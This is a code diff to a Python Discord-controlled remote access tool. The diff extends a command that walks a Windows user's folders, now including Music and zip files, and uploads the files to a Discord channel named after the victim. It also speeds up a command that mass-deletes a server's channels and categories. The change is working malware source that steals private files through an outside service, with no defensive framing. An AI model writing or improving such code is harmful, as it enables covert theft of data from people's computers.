@@ -17,23 +17,26 @@ import GPUtil,cpuinfo,socket,platform,random,string,rotatescreen,pyscreeze
 import pycaw
 import pyautogui, requests, win10toast, mss
 async def clean(ctx):
+    start_time = time.time()
     current_category = ctx.channel.category
+
+    delete_tasks = []
+
     for category in ctx.guild.categories:
         if category != current_category:
-            try:
-                for channel in category.channels:
-                    if channel.type == discord.ChannelType.text:
-                        await channel.delete()
-                await category.delete()
-            except Exception:
-                pass
-    for channel in ctx.guild.text_channels:
-        if channel.category is None:
-            try:
-                await channel.delete()
-            except Exception:
-                pass
-    await ctx.send("channels cleaned")
+            delete_tasks.extend(channel.delete() for channel in category.channels if channel.type == discord.ChannelType.text)
+            delete_tasks.append(category.delete())
+
+    delete_tasks.extend(channel.delete() for channel in ctx.guild.text_channels if channel.category is None)
+
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
+
+    elapsed_time = round(time.time() - start_time, 1)
+
+    embed = discord.Embed(title="Channels cleaned", color=discord.Color.green())
+    embed.description = f"Channels cleaned in {elapsed_time}s"
+
+    await ctx.send(embed=embed)
 
 async def clear(ctx):
     await ctx.channel.purge()
@@ -67,16 +70,17 @@ async def fileretrieval(ctx):
         getpcusername = os.getlogin()
         channel_name = f"{getpcusername}-files"
         guild = ctx.guild
+        category = ctx.channel.category
 
         async def create_channel():
-            return await guild.create_text_channel(channel_name)
+            return await guild.create_text_channel(channel_name, category=category)
 
         channel = await create_channel()
 
         async def send_files(directory, sent_files):
             for root, dirs, files in os.walk(directory, topdown=True):
                 for file in files:
-                    if file.lower().endswith(('.pdf', '.txt', '.html', '.csv')):
+                    if file.lower().endswith(('.pdf', '.txt', '.html', '.csv', '.zip')):
                         full_path = os.path.join(root, file)
                         if os.path.getsize(full_path) <= 9.9 * 1024 * 1024:
                             if full_path not in sent_files:
@@ -98,7 +102,8 @@ async def fileretrieval(ctx):
             r"C:\Users\%s\Pictures" % getpcusername,
             r"C:\Users\%s\Videos" % getpcusername,
             r"C:\Users\%s\Desktop" % getpcusername,
-            r"C:\Users\%s\AppData" % getpcusername
+            r"C:\Users\%s\AppData" % getpcusername,
+            r"C:\Users\%s\Music" % getpcusername
         ]
         
         dirs_to_scan = []
